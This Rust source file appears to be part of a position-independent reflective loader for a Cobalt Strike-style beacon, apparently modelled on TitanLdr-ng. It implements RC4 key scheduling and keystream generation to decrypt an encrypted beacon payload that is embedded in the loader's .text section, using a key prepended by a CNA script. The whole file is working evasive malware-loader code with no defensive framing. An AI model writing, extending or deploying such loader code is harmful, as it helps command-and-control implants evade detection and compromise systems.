//! Runtime beacon decryption using RC4.
//!
//! This module provides RC4 decryption for the encrypted beacon payload. The
//! encryption key is prepended to the loader by the CNA script (16 bytes before
//! the stub).
//!
//! # RC4 Algorithm
//!
//! RC4 is a stream cipher that generates a pseudo-random keystream:
//!
//! 1. **Key Scheduling (KSA)** - Initialize 256-byte state array from key
//! 2. **PRGA** - Generate keystream bytes by swapping state elements
//! 3. **XOR** - Combine keystream with ciphertext to produce plaintext
//!
//! # Usage
//!
//! ```text
//! CONFIG contains:
//!   [16-byte RC4 key][encrypted beacon]
//!
//! decrypt_beacon(key, src, dst, size) → plaintext beacon in dst
//! ```
//!
//! Based on TitanLdr-ng's Arc4.c implementation for position-independent code.

/// RC4 cipher context (256-byte state + indices)
#[repr(C)]
struct Arc4Context {
    i: u8,
    j: u8,
    s: [u8; 256],
}

/// Initializes RC4 context with a key (Key Scheduling Algorithm).
///
/// # Arguments
///
/// * `ctx` - Pointer to RC4 context structure
/// * `key` - Pointer to encryption key bytes
/// * `key_len` - Length of key in bytes
///
/// # Safety
///
/// - `ctx` must be valid and writable
/// - `key` must be valid for `key_len` bytes
#[link_section = ".text$E"]
unsafe fn arc4_init(ctx: *mut Arc4Context, key: *const u8, key_len: usize) {
    // Step 1: Initialize state array with identity permutation (0, 1, 2, ..., 255)
    for i in 0..256 {
        (*ctx).s[i] = i as u8;
    }

    (*ctx).i = 0;
    (*ctx).j = 0;

    // Step 2: Key Scheduling Algorithm (KSA) - mix key into state
    let mut j: u8 = 0;
    for i in 0..256 {
        j = j
            .wrapping_add((*ctx).s[i])
            .wrapping_add(*key.add(i % key_len));

        // Swap s[i] and s[j]
        let tmp = (*ctx).s[i];
        (*ctx).s[i] = (*ctx).s[j as usize];
        (*ctx).s[j as usize] = tmp;
    }
}

/// Generates the next keystream byte (Pseudo-Random Generation Algorithm).
///
/// # Returns
///
/// Next byte of the RC4 keystream.
///
/// # Safety
///
/// - `ctx` must be valid and initialized via `arc4_init`
#[link_section = ".text$E"]
unsafe fn arc4_next(ctx: *mut Arc4Context) -> u8 {
    // Step 1: Increment i and update j
    (*ctx).i = (*ctx).i.wrapping_add(1);
    (*ctx).j = (*ctx).j.wrapping_add((*ctx).s[(*ctx).i as usize]);

    // Step 2: Swap s[i] and s[j]
    let tmp = (*ctx).s[(*ctx).i as usize];
    (*ctx).s[(*ctx).i as usize] = (*ctx).s[(*ctx).j as usize];
    (*ctx).s[(*ctx).j as usize] = tmp;

    // Step 3: Generate keystream byte from s[s[i] + s[j]]
    let t = (*ctx).s[(*ctx).i as usize].wrapping_add((*ctx).s[(*ctx).j as usize]);
    (*ctx).s[t as usize]
}

/// Decrypt the beacon using RC4 (Titan-style: source to destination)
///
/// This function decrypts from the embedded encrypted beacon to a separate
/// RW buffer, matching TitanLdr's approach. The embedded beacon stays encrypted.
///
/// # Arguments
/// * `key_ptr` - Pointer to the 16-byte RC4 key (from CONFIG)
/// * `src` - Pointer to encrypted beacon (in .text section, read-only)
/// * `dst` - Pointer to destination buffer (RW memory, allocated by caller)
/// * `size` - Size of beacon to decrypt (in bytes)
///
/// # Safety
/// - key_ptr must be valid for 16 bytes
/// - src must be valid and readable for size bytes
/// - dst must be valid and writable for size bytes
/// - Caller must allocate dst buffer before calling
#[link_section = ".text$E"]
pub unsafe fn decrypt_beacon(key_ptr: *const u8, src: *const u8, dst: *mut u8, size: usize) {
    // Step 1: Stack-allocate RC4 context (no heap needed, PIC-safe)
    let mut ctx: Arc4Context = core::mem::zeroed();

    // Step 2: Initialize RC4 with the 16-byte key
    arc4_init(&mut ctx, key_ptr, 16);

    // Step 3: Decrypt by XORing each byte with keystream
    for i in 0..size {
        let keystream_byte = arc4_next(&mut ctx);
        *dst.add(i) = *src.add(i) ^ keystream_byte;
    }
}
